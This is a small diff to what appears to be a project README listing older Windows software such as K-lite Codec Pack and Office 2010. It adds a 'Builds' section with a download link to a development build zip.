@@ -27,3 +27,7 @@ Windows Media Player 12
 K-lite Codec Pack
 
 Microsoft Office 2010 (Including developer kit)
+
+## Builds
+
+[Latest Dev Build](https://panoptes.jp-osa-1.linodeobjects.com/oexl/package/oexl.zip)
